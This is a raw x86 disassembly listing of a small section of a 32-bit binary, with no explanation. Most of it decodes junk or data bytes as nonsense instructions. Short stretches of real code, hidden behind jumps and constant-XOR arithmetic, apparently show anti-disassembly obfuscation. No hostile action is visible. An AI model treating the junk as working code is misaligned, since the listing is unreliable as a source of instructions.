  40bfe3:	xor    DWORD PTR ds:0xba7f83d2,0xffffff9c
  40bfea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfeb:	cwde   
  40bfec:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40bfee:	daa    
  40bfef:	gs pop es
  40bff1:	addr16 fs mov bh,0x41
  40bff5:	mov    dh,0xf2
  40bff7:	sub    eax,0x8f1deff1
  40bffc:	inc    esp
  40bffd:	jmp    0x40bf87
  40bfff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c000:	mov    dh,0x60
  40c002:	mov    ah,0xe5
  40c004:	fsub   st,st(1)
  40c006:	cld    
  40c007:	or     DWORD PTR [ecx],ecx
  40c009:	or     ah,BYTE PTR [ebp+edx*8+0x47661c70]
  40c010:	dec    eax
  40c011:	dec    edi
  40c012:	mov    eax,ds:0x978b3f6
  40c017:	clc    
  40c018:	hlt    
  40c019:	xor    ebp,edi
  40c01b:	scas   eax,DWORD PTR es:[edi]
  40c01c:	jg     0x40bfee
  40c01e:	mov    ecx,0x244ad2e1
  40c023:	dec    eax
  40c024:	mov    ah,0xc
  40c026:	fwait
  40c027:	in     al,0xd5
  40c029:	in     eax,0xdd
  40c02b:	xor    bl,BYTE PTR [ebx+0x2e]
  40c02e:	ret    
  40c02f:	cmp    eax,0x9d297413
  40c034:	mov    cl,0x93
  40c036:	jo     0x40bfc9
  40c038:	sbb    eax,0x52b76a62
  40c03d:	jmp    0x40c08d
  40c03f:	or     DWORD PTR [ebp+eax*1+0x5e07fe3],esp
  40c046:	lds    eax,FWORD PTR [ecx]
  40c048:	add    bl,BYTE PTR [edx+ebx*2-0x4e]
  40c04c:	leave  
  40c04d:	hlt    
  40c04e:	cmp    ebx,DWORD PTR [edi-0x73e9830f]
  40c054:	mov    ?,ecx
  40c056:	cld    
  40c057:	cmp    bl,BYTE PTR [esi]
  40c059:	and    edi,DWORD PTR [esi+0x17]
  40c05c:	cmp    BYTE PTR [eax],dl
  40c05e:	jl     0x40c0a0
  40c060:	cld    
  40c061:	push   ebp
  40c062:	xor    DWORD PTR [edi-0x7],ecx
  40c065:	mov    ebp,0xf28439ba
  40c06a:	add    al,0xfd
  40c06c:	mov    bh,0xe9
  40c06e:	stc    
  40c06f:	dec    ebp
  40c070:	shl    BYTE PTR [esi+0x71f55f15],1
  40c076:	inc    ecx
  40c077:	jmp    0x8c30:0x8261c47
  40c07e:	mov    BYTE PTR [ebp-0x3e],ah
  40c081:	mov    ecx,0x7510859
  40c086:	xor    edx,edx
  40c088:	xor    edi,ecx
  40c08a:	mov    esi,0x32729f
  40c08f:	add    edi,esi
  40c091:	div    edi
  40c093:	mov    edx,DWORD PTR [ebp-0x4]
  40c096:	xor    edx,ecx
  40c098:	lea    eax,[edx+eax*1+0x32729f]
  40c09f:	mov    edx,DWORD PTR [ebp+0x8]
  40c0a2:	mov    edi,DWORD PTR [ebp-0x24]
  40c0a5:	mov    DWORD PTR [edi+edx*4],eax
  40c0a8:	mov    eax,DWORD PTR [ebp-0x18]
  40c0ab:	mov    edx,DWORD PTR [ebp+0x8]
  40c0ae:	xor    eax,ecx
  40c0b0:	lea    eax,[eax+edx*1+0x32729f]
  40c0b7:	mov    DWORD PTR [ebp+0x8],eax
  40c0ba:	mov    eax,DWORD PTR [ebp-0x18]
  40c0bd:	mov    edx,DWORD PTR [ebp+0x14]
  40c0c0:	xor    eax,ecx
  40c0c2:	add    eax,esi
  40c0c4:	imul   eax,DWORD PTR [edx]
  40c0c7:	mov    edx,DWORD PTR [ebp-0x4]
  40c0ca:	xor    edx,ecx
  40c0cc:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0cf:	jmp    0x40c1b4
  40c0d4:	mov    ebx,0x61b1c335
  40c0d9:	pop    ecx
  40c0da:	mov    ecx,0x5c6a2de5
  40c0df:	xchg   edi,eax
  40c0e0:	mov    edx,0xe138023d
  40c0e5:	xor    eax,0x7eb67e7e
  40c0ea:	jle    0x40c16a
  40c0ec:	xchg   dl,cl
  40c0ee:	mov    bh,0x73
  40c0f0:	sbb    edi,DWORD PTR [edi+0x9]
  40c0f3:	fisttp DWORD PTR [ecx+0x41cccac3]
  40c0f9:	nop
  40c0fa:	fnstsw WORD PTR [esi+0x6bb6db7d]
  40c100:	or     dh,BYTE PTR [eax]
  40c102:	test   al,0x9b
  40c104:	in     eax,0xf0
  40c106:	mov    edx,0x266a45a4
  40c10b:	arpl   WORD PTR ds:0x3dceaeb3,bp
  40c111:	(bad)  
  40c112:	and    BYTE PTR [esi-0x7e],al
  40c115:	rol    DWORD PTR [eax],cl
  40c117:	pop    es
  40c118:	daa    
  40c119:	loop   0x40c181
  40c11b:	ret    0x8c79
  40c11e:	ficomp DWORD PTR [eiz*2+0x51319f6d]
  40c125:	clc    
  40c126:	lods   eax,DWORD PTR ds:[esi]
  40c127:	loope  0x40c13c
  40c129:	jbe    0x40c18e
  40c12b:	adc    DWORD PTR [ebp-0x14c6bce2],edx
  40c131:	mov    ch,0xd3
  40c133:	lea    ebx,[esi]
  40c135:	in     al,0x62
  40c137:	sar    DWORD PTR [bp+di-0x7612],0x3c
  40c13d:	push   ss
  40c13e:	lahf   
  40c13f:	icebp  
  40c140:	and    BYTE PTR [eax],ah
  40c142:	iret   
  40c143:	push   0xfdc10cde
  40c148:	jmp    0x40c175
  40c14a:	cmp    eax,0xf7ce9ac8
  40c14f:	pushf  
  40c150:	adc    DWORD PTR [edi+esi*8],0x6ffe32bc
  40c157:	mov    edi,0x8c076314
  40c15c:	pushf  
  40c15d:	sti    
  40c15e:	out    0x5d,eax
  40c160:	ds cmp eax,0x10188ab2
  40c166:	sidtd  [ecx-0x4d35135c]
  40c16d:	in     eax,dx
  40c16e:	pop    ecx
  40c16f:	mov    eax,ds:0x67885697
  40c174:	into   
  40c175:	xchg   ebx,eax
  40c177:	jbe    0x40c1a3
  40c179:	add    al,BYTE PTR [esi+0x5f]
  40c17c:	nop
  40c17d:	cmp    esi,DWORD PTR [edx-0xa2ec783]
  40c183:	xchg   BYTE PTR [eax],ch
  40c185:	push   esp
  40c186:	push   es
  40c187:	in     al,0x9c
  40c189:	mov    DWORD PTR [ebx-0x76],ecx
  40c18c:	leave  
  40c18d:	(bad)  
  40c18e:	popa   
  40c18f:	arpl   WORD PTR [ecx-0x5c],di
  40c192:	mov    eax,0x70638b88
  40c197:	cmp    ecx,eax
  40c199:	rcr    BYTE PTR [ebp+eiz*8-0x5583bd7f],cl
  40c1a0:	xor    al,0x38
  40c1a2:	scas   eax,DWORD PTR es:[edi]
  40c1a3:	xchg   ecx,eax
  40c1a4:	push   edi
  40c1a5:	rol    DWORD PTR [eax+eax*4-0x258de8c0],1
  40c1ac:	hlt    
  40c1ad:	pop    ecx
  40c1ae:	aaa    
  40c1af:	push   esi
  40c1b0:	cmp    edi,DWORD PTR [esi+0x17]
  40c1b3:	adc    eax,0x9f0a8c8d
  40c1b8:	jb     0x40c1ec
  40c1ba:	add    BYTE PTR [ebx],bh
  40c1bc:	enter  0x850f,0xcc
  40c1c0:	std    
  40c1c1:	(bad)  
  40c1c2:	dec    DWORD PTR [ebx+0xeae9de]
  40c1c8:	add    BYTE PTR [eax],al
  40c1ca:	mov    ebx,0x32729f
  40c1cf:	jmp    0x40c2b4
  40c1d4:	mov    al,0x75
  40c1d6:	or     eax,0x598459f4
  40c1db:	leave  
  40c1dc:	jns    0x40c1f9
  40c1de:	or     ah,BYTE PTR [ecx+0x50b628a0]
  40c1e4:	cmp    edx,ecx
  40c1e6:	jle    0x40c266
  40c1e8:	mov    dh,0x7e
  40c1ea:	jle    0x40c26a
  40c1ec:	mov    esp,0xff30e6e
  40c1f1:	or     BYTE PTR [ecx-0x6121e7],bl
  40c1f7:	loop   0x40c1a0
  40c1f9:	mov    bh,BYTE PTR [esi+0x10]
  40c1fc:	mov    ah,0xac
  40c1fe:	les    eax,FWORD PTR [ecx-0x3008450c]
  40c204:	xor    al,0xe8
  40c206:	(bad)  
  40c207:	push   ebp
  40c208:	dec    esp
  40c209:	popa   
  40c20a:	test   ah,dl
  40c20c:	or     eax,0xb1790a3e
  40c211:	clc    
  40c212:	mov    ch,0xd0
  40c214:	mov    edx,0x4bd337ec
  40c219:	push   es
  40c21a:	push   esi
  40c21b:	stos   BYTE PTR es:[edi],al
  40c21c:	in     eax,dx
  40c21d:	dec    ebp
  40c21e:	icebp  
  40c21f:	fst    QWORD PTR [edi-0x42]
  40c222:	jns    0x40c1ed
  40c224:	(bad)  
  40c225:	jno    0x40c1eb
  40c227:	inc    edx
  40c228:	push   ecx
  40c229:	scas   eax,DWORD PTR es:[edi]
  40c22a:	lds    cx,DWORD PTR [eax-0x4e]
  40c22e:	test   al,0xa2
  40c230:	or     eax,DWORD PTR [esi]
  40c232:	aam    0x2f
  40c234:	fstp   DWORD PTR [eax]
  40c236:	popa   
  40c237:	cmp    al,0x15
  40c239:	outs   dx,BYTE PTR ds:[esi]
  40c23a:	pop    edx
  40c23b:	jg     0x40c2ba
  40c23d:	jle    0x40c1d8
  40c23f:	mov    ds,WORD PTR [eax]
  40c241:	mov    esp,0x8787d424
  40c246:	mov    bl,0x31
  40c248:	or     al,0xb9
  40c24a:	addr16 push ebx
  40c24c:	int3   
  40c24d:	std    
  40c24e:	popf   
  40c24f:	(bad)  
  40c250:	mov    ebp,0x59429a5e
  40c255:	test   al,cl
  40c257:	es stos DWORD PTR es:[edi],eax
  40c259:	test   DWORD PTR [ebx-0x40],ecx
  40c25c:	push   0x29da778a
  40c261:	mov    esp,DWORD PTR [eax+0x260f7e79]
  40c267:	jmp    DWORD PTR [esi-0x4b]
  40c26a:	cwde   
  40c26b:	cld    
  40c26c:	inc    edi
  40c26d:	and    eax,DWORD PTR [edx+0x21]
  40c270:	hlt    
  40c271:	into   
  40c272:	jg     0x40c212
  40c274:	les    ecx,FWORD PTR [esi+0x358460b6]
  40c27a:	das    
  40c27b:	shl    BYTE PTR [edi],0xc0
  40c27e:	or     al,0x5f
  40c280:	mov    ecx,0xf8519a21
  40c285:	clc    
  40c286:	adc    al,0xe4
  40c288:	jno    0x40c2dd
  40c28a:	cmp    eax,DWORD PTR [esi]
  40c28c:	lods   al,BYTE PTR ds:[esi]
  40c28d:	rep lods al,BYTE PTR ds:[esi]
  40c28f:	and    al,0x37
  40c291:	mov    al,ds:0x55b06410
  40c296:	sub    DWORD PTR [esi],edx
  40c298:	(bad)  
  40c29a:	and    al,0x5
  40c29c:	push   ds
  40c29d:	in     al,dx
  40c29e:	stc    
  40c29f:	inc    ecx
  40c2a0:	fstp   QWORD PTR [ebx]
  40c2a2:	les    edi,FWORD PTR [edi+eax*1-0x52]
  40c2a6:	or     DWORD PTR [esi+0x6e],esp
  40c2a9:	or     DWORD PTR [esi],ebp
  40c2ab:	mov    bh,0xa8
  40c2ad:	xchg   ch,bl
  40c2af:	push   es
  40c2b0:	mov    ecx,DWORD PTR ds:0x458ba671
  40c2b6:	cld    
  40c2b7:	xor    eax,0x7510859
  40c2bc:	add    eax,ebx
  40c2be:	mov    DWORD PTR [ebp-0xc],eax
  40c2c1:	xor    ebx,ebx
  40c2c3:	lea    eax,[ebp-0x10]
  40c2c6:	add    ebx,DWORD PTR [eax]
  40c2c8:	jmp    0x40c3ad
  40c2cd:	sbb    al,0xbe
  40c2cf:	cmp    al,0xc2
  40c2d1:	pop    esp
  40c2d2:	inc    eax
  40c2d3:	and    BYTE PTR [eax+0x3b],ah
  40c2d6:	gs xchg edx,ebp
  40c2d9:	imul   eax,DWORD PTR [edi-0x51],0x5a
  40c2dd:	jno    0x40c2aa
  40c2df:	jle    0x40c35f
  40c2e1:	mov    dh,0x7e
  40c2e3:	jle    0x40c363
  40c2e5:	out    0x7c,eax
  40c2e7:	xor    edx,DWORD PTR [esi]
  40c2e9:	xchg   esi,eax
  40c2ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2eb:	add    eax,0x952e295d
  40c2f0:	and    bh,BYTE PTR [ebx+0x37e2cbf0]
  40c2f6:	(bad)  
  40c2f7:	ds xchg edx,eax
  40c2f9:	stc    
  40c2fa:	mov    eax,0xe544622a
  40c2ff:	(bad)  
  40c300:	push   ds
  40c301:	pop    ebp
  40c302:	arpl   WORD PTR [ebp+esi*1+0x68],bp
  40c306:	(bad)  
  40c307:	xlat   BYTE PTR ds:[ebx]
  40c308:	xor    BYTE PTR [ebp-0x40],0xa
  40c30c:	push   ds
  40c30d:	jmp    0x40c30e
  40c30f:	mov    ebx,0x24704ad6
  40c314:	mov    edx,0xae494e77
  40c319:	mov    eax,0x2557cc9
  40c31e:	jg     0x40c34b
  40c320:	jmp    0x1903c20
  40c325:	sbb    ebp,esp
  40c327:	mov    ch,0xeb
  40c329:	popa   
  40c32a:	dec    eax
  40c32b:	outs   dx,DWORD PTR ds:[esi]
  40c32c:	sub    al,0xba
  40c32e:	xchg   edi,eax
  40c32f:	stos   BYTE PTR es:[edi],al
  40c330:	cmp    eax,0xeda81f0e
  40c335:	aad    0x10
  40c337:	inc    eax
  40c338:	icebp  
  40c339:	mov    ah,BYTE PTR [ebp+0x1f]
  40c33c:	iret   
  40c33d:	lds    ebp,FWORD PTR [ecx]
  40c33f:	jne    0x40c37d
  40c341:	mov    ebp,ebp
  40c343:	jge    0x40c394
  40c345:	add    dh,bl
  40c347:	aam    0xc4
  40c349:	gs xchg ebx,eax
  40c34b:	push   0xfbd9ce97
  40c350:	dec    edi
  40c351:	mov    cl,0xa
  40c353:	dec    edi
  40c354:	popf   
  40c355:	or     eax,0xd3db92da
  40c35a:	lahf   
  40c35b:	dec    ebp
  40c35c:	int    0x7b
  40c35e:	inc    ebx
  40c35f:	xchg   ecx,eax
  40c360:	push   edi
  40c361:	div    cl
  40c363:	out    dx,al
  40c364:	les    esp,FWORD PTR [edx-0x7f]
  40c367:	les    ebx,FWORD PTR [esi]
  40c369:	test   DWORD PTR [edx+0x44417bd2],ecx
  40c36f:	(bad)  
  40c370:	mov    esp,eax
  40c372:	inc    esp
  40c373:	lds    esi,FWORD PTR [ecx+0x24]
  40c376:	mov    ebp,0x5a649140
  40c37b:	dec    edi
  40c37c:	inc    edx
  40c37d:	sub    al,0x0
  40c37f:	stos   BYTE PTR es:[edi],al
  40c380:	mov    esp,0x11b917eb
  40c385:	sub    ch,BYTE PTR [ecx]
  40c387:	or     bh,BYTE PTR [edx-0x149738e]
  40c38d:	or     DWORD PTR [edi-0x4b],esp
  40c390:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c391:	enter  0xb803,0x78
  40c395:	pop    edx
  40c396:	and    BYTE PTR ds:0xe23b1aec,bl
  40c39c:	fst    QWORD PTR [edi+ebp*4-0x7a]
  40c3a0:	aam    0x44
  40c3a2:	and    eax,0x6eb8bbc
  40c3a7:	popa   
  40c3a8:	aad    0x1b
  40c3aa:	jnp    0x40c35a
  40c3ac:	jle    0x40c3ad
  40c3ae:	shl    DWORD PTR [ebx],cl
  40c3b0:	fucomi st,st(1)
  40c3b2:	loopne 0x40c3b4
  40c3b4:	add    BYTE PTR [eax],al
  40c3b6:	popa   
  40c3b7:	jno    0x40c409
  40c3b9:	jnp    0x40c41b
  40c3bb:	jnp    0x40c436
  40c3bd:	or     DWORD PTR ds:0x4b2e5fee,ecx
  40c3c3:	fdiv   QWORD PTR [edx+0x7ecb49ba]
  40c3c9:	jle    0x40c381
  40c3cb:	jle    0x40c44b
  40c3cd:	jle    0x40c3fa
  40c3cf:	sbb    DWORD PTR [ecx-0x39],edi
  40c3d2:	adc    eax,0x9695471e
  40c3d7:	push   eax
  40c3d8:	adc    BYTE PTR [eax],bh
  40c3da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3db:	jns    0x40c3bf
  40c3dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3de:	outs   dx,DWORD PTR ds:[esi]
  40c3df:	jb     0x40c45e
  40c3e1:	push   edi
  40c3e2:	mov    ebp,0x13964f5
  40c3e7:	sub    BYTE PTR [ebx],bh
  40c3e9:	out    dx,al
  40c3ea:	add    al,0x83
  40c3ec:	pop    edx
  40c3ed:	aaa    
  40c3ee:	mov    ecx,cs
  40c3f0:	mov    dl,0x9
  40c3f2:	mov    ch,0xe9
  40c3f4:	out    0x62,eax
  40c3f6:	in     al,0xf5
  40c3f8:	mov    al,0x6b
  40c3fa:	adc    edx,ebp
  40c3fc:	xor    bl,bh
  40c3fe:	int3   
  40c3ff:	(bad)  
  40c400:	mov    al,ds:0xc6699127
  40c405:	push   ecx
  40c406:	adc    BYTE PTR [ecx],bl
  40c408:	ins    BYTE PTR es:[edi],dx
  40c409:	push   0xffffffd9
  40c40b:	daa    
  40c40c:	jno    0x40c432
  40c40e:	jecxz  0x40c46b
  40c410:	push   edi
  40c411:	ds pop edi
  40c413:	push   ebx
  40c414:	fstp   QWORD PTR [esi+0x25e18222]
  40c41a:	std    
  40c41b:	cmp    BYTE PTR [esi],dh
  40c41d:	xor    eax,0x89b30581
  40c422:	dec    edx
  40c423:	pusha  
  40c424:	add    ebx,DWORD PTR [ebx-0x42]
  40c427:	sbb    BYTE PTR [ecx+0x3f2c5b35],0x68
  40c42e:	sub    al,0x29
  40c430:	push   esi
  40c431:	cld    
  40c432:	div    DWORD PTR [edx+0x29]
  40c435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c436:	pop    esi
  40c437:	mov    gs,esp
  40c439:	cmc    
  40c43a:	mul    ebp
  40c43c:	xor    BYTE PTR [edx],bh
  40c43e:	push   edx
  40c43f:	sub    ebx,eax
  40c441:	daa    
  40c442:	cmp    al,BYTE PTR [eax+esi*4]
  40c445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c447:	sbb    ch,dl
  40c449:	int3   
  40c44a:	clc    
  40c44b:	outs   dx,BYTE PTR ds:[esi]
  40c44c:	dec    eax
  40c44d:	out    dx,eax
  40c44e:	jne    0x40c44b
  40c450:	jecxz  0x40c416
  40c452:	out    dx,eax
  40c453:	dec    edx
  40c454:	and    al,BYTE PTR [ecx]
  40c456:	ret    
  40c457:	ret    0xcc
  40c45a:	or     eax,0x4df0bbc4
  40c45f:	sbb    BYTE PTR [edi+0x3e33b295],al
  40c465:	cwde   
  40c466:	jmp    0x997b6772
  40c46b:	pop    edx
  40c46c:	and    eax,0x83f76a47
  40c471:	(bad)  
  40c472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c473:	or     al,BYTE PTR [edi+eiz*4]
  40c476:	bound  edi,QWORD PTR [ecx+0x59]
  40c479:	dec    edx
  40c47a:	or     al,0x32
  40c47c:	popa   
  40c47d:	aas    
  40c47e:	dec    ebx
  40c47f:	mov    cl,BYTE PTR ds:0x1286625e
  40c485:	sub    edx,DWORD PTR [ecx+0x72]
  40c488:	lds    eax,FWORD PTR [esi]
  40c48a:	enter  0xe55d,0xd3
  40c48e:	retf   0x208c
  40c491:	mov    eax,ds:0xd5caee09
  40c496:	inc    ebx
  40c497:	cmp    DWORD PTR [ebp+0x10],ebx
  40c49a:	jmp    0x40c57f
  40c49f:	test   al,0xfc
  40c4a1:	xchg   esi,eax
  40c4a2:	push   esi
  40c4a3:	stos   BYTE PTR es:[edi],al
  40c4a4:	push   esp
  40c4a5:	push   0xe4b270b0
  40c4aa:	gs cld 
  40c4ac:	pusha  
  40c4ad:	std    
  40c4ae:	adc    eax,DWORD PTR [ecx-0x49818138]
  40c4b4:	jle    0x40c534
  40c4b6:	jle    0x40c498
  40c4b8:	xor    eax,0x660eb5bb
  40c4bd:	inc    edi
  40c4be:	loopne 0x40c4e4
  40c4c0:	mov    ds:0x2e292602,al
  40c4c5:	pop    ecx
  40c4c6:	aaa    
  40c4c7:	jecxz  0x40c4d6
  40c4c9:	push   0xcc3fa0d0
  40c4ce:	mov    edi,0x673f3a28
  40c4d3:	dec    esi
  40c4d4:	fs jp  0x40c515
  40c4d7:	push   edx
  40c4d8:	lahf   
  40c4d9:	inc    ecx
  40c4da:	rcl    DWORD PTR [edx+0x38a840f5],0x48
  40c4e1:	out    0x4c,eax
  40c4e3:	sti    
  40c4e4:	mov    bl,0x9
  40c4e6:	push   eax
  40c4e7:	jne    0x40c556
  40c4e9:	loope  0x40c4b6
  40c4eb:	or     dh,ch
  40c4ed:	mov    DWORD PTR [eax+0x2a],edx
  40c4f0:	mov    ebp,0x999ff093
  40c4f5:	fs dec edx
  40c4f7:	jmp    0x5416e809
  40c4fc:	(bad)  
  40c4fe:	leave  
  40c4ff:	or     DWORD PTR [edi+esi*2+0x60],edx
  40c503:	std    
  40c504:	sar    ecx,1
  40c506:	(bad)  
  40c507:	sti    
  40c508:	sti    
  40c509:	push   eax
  40c50a:	mov    bl,0xf3
  40c50c:	test   ch,0xf2
  40c50f:	xor    ch,0x73
  40c512:	(bad)  
  40c513:	in     eax,dx
  40c514:	lods   al,BYTE PTR ds:[esi]
  40c515:	retf   0x17cf
  40c518:	mov    dl,BYTE PTR [esi+eax*4]
  40c51b:	xor    al,0x46
  40c51d:	call   0x5ea664ff
  40c522:	cmp    esp,DWORD PTR [eax+eax*1]
  40c525:	push   esp
  40c526:	ret    
  40c527:	out    dx,al
  40c528:	inc    edi
  40c529:	lock push edi
  40c52b:	mov    ah,0x53
  40c52d:	(bad)
  40c531:	push   es
  40c532:	lahf   
  40c533:	ja     0x40c4e8
  40c535:	popf   
  40c536:	out    dx,eax
  40c537:	mov    edx,0xba65ac62
  40c53c:	pop    ebp
  40c53d:	ror    BYTE PTR [edi+ebx*8+0x4c],1
  40c541:	pop    esi
  40c542:	push   es
  40c543:	loopne 0x40c599
  40c545:	dec    ecx
  40c546:	xor    eax,0x19a85575
  40c54b:	cmc    
  40c54c:	retf   0xea44
  40c54f:	jmp    0x2b85eaed
  40c554:	mul    al
  40c556:	lods   eax,DWORD PTR ds:[esi]
  40c557:	stc    
  40c558:	stos   DWORD PTR es:[edi],eax
  40c559:	bound  ebx,QWORD PTR [ecx+0x39]
  40c55c:	out    dx,eax
  40c55d:	cmp    dh,BYTE PTR [edi+0x6280bd0c]
  40c563:	mov    edi,0xca885600
  40c568:	mov    ebp,0x6821255
  40c56d:	xchg   ecx,eax
  40c56e:	dec    ebx
  40c56f:	lahf   
  40c570:	xchg   ecx,eax
  40c571:	pop    es
  40c572:	into   
  40c573:	rcr    BYTE PTR [esi],0x17
  40c576:	xchg   ebx,eax
  40c577:	inc    esi
  40c578:	popf   
  40c579:	retf   0xdb59
  40c57c:	and    ecx,DWORD PTR [ecx-0x7]
  40c57f:	je     0x40c682
  40c585:	xchg   edx,eax
  40c586:	push   0xa
  40c588:	pop    ecx
  40c589:	push   0x4
  40c58b:	pop    ebx
  40c58c:	inc    ebx
  40c58d:	xchg   ebx,ecx
  40c58f:	sub    ebx,ecx
  40c591:	xchg   ebx,ecx
  40c593:	jmp    0x40c678
  40c598:	xchg   DWORD PTR [eax+0x3d],ebx
  40c59b:	out    0x31,al
  40c59d:	jnp    0x40c544
  40c59f:	jns    0x40c5e7
  40c5a1:	add    al,0x4b
  40c5a3:	call   0xa53eab9c
  40c5a8:	fxch   st(1)
  40c5aa:	jle    0x40c62a
  40c5ac:	mov    dh,0x7e
  40c5ae:	jle    0x40c62e
  40c5b0:	mov    ebp,0x6f70829c
  40c5b5:	push   ds
  40c5b6:	xchg   esp,eax
  40c5b7:	(bad)  
  40c5b8:	scas   al,BYTE PTR es:[edi]
  40c5b9:	(bad)  
  40c5ba:	sub    dh,BYTE PTR [ecx]
  40c5bc:	ds adc eax,0x45788114
  40c5c2:	xor    dl,BYTE PTR [ebx+0x2aeb26b8]
  40c5c8:	xchg   esi,eax
  40c5c9:	(bad)  
  40c5ca:	mov    ah,0xb5
  40c5cc:	xchg   BYTE PTR [ebp+0x23c25f71],bh
  40c5d2:	sub    dh,BYTE PTR [ebp+0x25655a9e]
  40c5d8:	ja     0x40c59f
  40c5da:	std    
  40c5db:	cmp    DWORD PTR [ecx-0x80],0x1a
  40c5df:	retf   
  40c5e0:	mov    ds:0xdc5c9e2c,al
  40c5e5:	inc    edi
  40c5e6:	mov    ebp,0x8fd5cc70
  40c5eb:	push   0xffffffa1
  40c5ed:	test   BYTE PTR [esi-0x51],dl
  40c5f0:	jle    0x40c57c
  40c5f2:	jle    0x40c628
  40c5f4:	test   al,0xd9
  40c5f6:	mov    bl,0xb8
  40c5f8:	add    al,BYTE PTR [ecx+eax*4+0x56ae00b]
  40c5ff:	js     0x40c5ef
  40c601:	mov    esp,0x48121f21
  40c606:	pop    ebx
  40c607:	(bad)  
  40c608:	dec    bx
  40c60a:	pop    es
  40c60b:	jmp    0x71e0:0xff3ba33f
  40c612:	cwde   
  40c613:	or     BYTE PTR fs:[ebx],cl
  40c616:	add    esi,DWORD PTR ds:0x6b240c15
  40c61c:	repz fsubp st(4),st
  40c61f:	outs   dx,DWORD PTR ds:[esi]
  40c620:	fistp  WORD PTR [ebx-0x3591c81e]
  40c626:	mov    edx,0x945efe1b
  40c62b:	ins    BYTE PTR es:[edi],dx
  40c62c:	loope  0x40c64c
  40c62e:	mov    cl,0xd1
  40c630:	fnstenv ds:0x533be44d
  40c636:	add    ch,cl
  40c638:	mov    edx,0xe9f07fe9
  40c63d:	xlat   BYTE PTR ds:[ebx]
  40c63e:	test   al,0x3
  40c640:	and    eax,0xd354462a
  40c645:	mov    esi,0x2167daf
  40c64a:	jl     0x40c636
  40c64c:	adc    DWORD PTR [ebp-0x145ffa03],edi
  40c652:	pop    es
  40c653:	cmp    DWORD PTR ds:0x482f5144,ebp
  40c659:	hlt    
  40c65a:	in     al,0xba
  40c65c:	inc    edi
  40c65d:	add    ecx,ecx
  40c65f:	inc    ebx
  40c660:	and    ebp,DWORD PTR [ebx-0x3b]
  40c663:	lock or eax,edx
  40c666:	xor    edi,DWORD PTR [ebp-0x10]
  40c669:	bound  ecx,QWORD PTR [edi+0x344d6ca7]
  40c66f:	add    dl,BYTE PTR [ecx+0x26836a93]
  40c675:	jl     0x40c676
  40c677:	pop    edi
  40c678:	dec    ecx
  40c679:	mov    eax,DWORD PTR [ebp-0x1c]
  40c67c:	imul   eax,ecx
  40c67f:	add    esp,eax
  40c681:	xchg   edx,eax
  40c682:	push   eax
  40c683:	xor    ebx,ebx
  40c685:	mov    edx,esp
  40c687:	dec    edx
  40c688:	inc    ebx
  40c689:	add    ebx,DWORD PTR [edx+ebx*1]
  40c68c:	dec    ebx
  40c68d:	xor    edx,edx
  40c68f:	add    DWORD PTR [ebp-0xc],ebx
  40c692:	pop    ebx
  40c693:	mov    eax,DWORD PTR [ebp-0xc]
  40c696:	pop    edi
  40c697:	pop    esi
  40c698:	pop    ebx
  40c699:	leave  
  40c69a:	ret    0x10
